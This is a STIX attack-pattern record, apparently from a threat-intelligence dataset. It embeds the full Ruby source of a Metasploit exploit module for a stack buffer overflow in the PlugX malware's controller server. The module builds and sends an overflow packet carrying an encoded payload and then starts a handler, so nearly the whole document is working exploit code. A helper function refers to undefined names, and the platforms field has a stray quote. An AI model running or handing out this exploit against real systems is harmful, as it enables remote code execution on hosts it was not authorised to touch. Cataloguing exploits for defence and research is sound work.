{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4d3014a0-b9bc-4f63-bb26-70b556fd6596",
    "created": "2024-08-14T16:46:41.90306Z",
    "modified": "2024-08-14T16:46:41.903064Z",
    "name": "PlugX Controller Stack Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in the PlugX Controller (C2 server). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/plugx.rb",
            "external_id": "plugx.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'zlib'\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PlugX Controller Stack Buffer Overflow',\n      'Description'    => %q{\n        This module exploits a stack buffer overflow in the PlugX Controller (C2 server).\n      },\n      'Author'         => 'Professor Plum',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 0xe000,\n          'BadChars' => '',\n          'EncoderType' => Msf::Encoder::Type::AlphanumMixed\n        },\n      'Platform'       => 'win',\n      'DisclosureDate' => '2017-07-27',\n      'Targets'        =>\n        [\n          ['PlugX Type I (old)', { 'xor' => 0, 'callebp' => 0x004045c4 }],\n          ['PlugX Type I',         { 'xor' => 1, 'callebp' => 0x004045c4 }],\n          ['PlugX Type II',        { 'xor' => 2, 'callebp' => 0x004045c4 }]\n        ],\n      'Privileged'     => false,\n      'DefaultTarget' => 2)\n    )\n\n    register_options(\n      [\n        Opt::RPORT(13579)\n      ]\n    )\n  end\n\n  def xor_stream1(key, src)\n    key0 = key1 = key2 = key3 = key\n    dst = ''\n    for i in 0..(src.size - 1)\n      key0 = (key0 + (key0 >> 3) - 0x11111111) & 0xFFFFFFFF\n      key1 = (key1 + (key1 >> 5) - 0x22222222) & 0xFFFFFFFF\n      key2 = (key2 + 0x44444444 - (key2 << 9)) & 0xFFFFFFFF\n      key3 = (key3 + 0x33333333 - (key3 << 7)) & 0xFFFFFFFF\n      new_key = (key2 + key3 + key1 + key0) & 0xFF\n      res = src[i].ord ^ new_key\n      dst += res.chr\n    end\n    dst\n  end\n\n  def xor_stream1a(key, src)\n    key0 = key1 = key2 = key3 = key\n    dst = ''\n    for i in 0..(src.size - 1)\n      key0 = (key0 + (key0 >> 3) + 3) & 0xFFFFFFFF\n      key1 = (key1 + (key1 >> 5) + 5) & 0xFFFFFFFF\n      key2 = (key2 - 7 - (key2 << 9)) & 0xFFFFFFFF\n      key3 = (key3 - 9 - (key3 << 7)) & 0xFFFFFFFF\n      new_key = (key2 + key3 + key1 + key0) & 0xFF\n      res = src[i].ord ^ new_key\n      dst += res.chr\n    end\n    dst\n  end\n\n  def xor_stream2(key, data)\n    dst = ''\n    for i in 0..(data.size - 1)\n      key = (((key << 7) & 0xFFFFFFFF) - ((key >> 3) & 0xFFFFFFFF) + i + 0x713A8FC1) & 0xFFFFFFFF\n      dst += ((key & 0xFF) ^ ((key >> 8) & 0xFF) ^ ((key >> 16) & 0xFF) ^ data[i].ord ^ ((key >> 24) & 0xFF)).chr\n    end\n    dst\n  end\n\n  def xor_wrap(key, data)\n    if target['xor'] == 0\n      return xor_stream1a(key, data)\n    elsif target['xor'] == 1\n      return xor_stream1(key, data)\n    elsif target['xor'] == 2\n      return xor_stream2(key, data)\n    end\n    print_status('Unknown PlugX Type')\n  end\n\n  def validate_response(data)\n    if data.nil?\n      print_status('Server closed connection')\n      return false\n    end\n    if data.empty?\n      print_status('No response received')\n      return false\n    end\n    if data.size < 16\n      print_status('Invalid packet')\n      print_status(data.inspect)\n      return false\n    end\n    key = data[0..4].unpack('I<')[0]\n    hdr = xor_wrap(key, data[0..16])\n    _x, _flags, _cmd, comp_size, _uncomp_size, _xx = hdr.unpack('I<S<S<S<S<I<')\n    if (comp_size + 16) == data.size\n      raw = xor_wrap(key, data[16..-1])\n      print_status(raw.inspect)\n      return true\n    end\n    false\n  end\n\n  def check\n    connect\n    key = rand(0xFFFFFFFF)\n    hh = [key, 0, 0, 0, 0, 0].pack('I<S<S<S<S<I<')\n    hdr = xor_wrap(key, hh)\n    sock.put([key].pack('I<') + hdr[4..-1])\n    if validate_response(sock.get_once || '')\n      return Exploit::CheckCode::Appears\n    end\n    Exploit::CheckCode::Safe\n  end\n\n  def decode_packet(data)\n    key = data[0..4].unpack('I<')\n    _x, flags, _cmd, _comp_size, _uncomp_size, _xx = xorstream2(key, data[0..16]).unpack('I<S<S<S<S<I<')\n\n    buf = xor_stream(key, data[16..-1])\n    buf = decompress(buf)\n    return the_flags[flags & 0xffff], xx, buf\n  end\n\n  def exploit\n    print_status(\"Trying target #{target.name}...\")\n\n    l = 0xF008\n    pad = 0x18\n    a = 0x004045c4\n    pktlen = l + pad + 9\n    jmp = \"\\xe9\" + [-pktlen].pack('I<')\n    key = rand(0xFFFFFFFF)\n    hh = [key, 0, 0, pktlen, pktlen, 0].pack('I<S<S<S<S<I<')\n    hdr = xor_wrap(key, hh)\n    pkt = [key].pack('I<') + hdr[4..-1] + payload.encoded + 'A' * (l - payload.encoded.size) + [a].pack('I<') + 'x' * pad + jmp\n\n    connect\n    sock.put(pkt)\n\n    print_status('Waiting for response')\n    validate_response(sock.get_once)\n    disconnect\n\n    handler\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-07-27",
    "x_mitre_platforms": [
        "win'"
    ]
}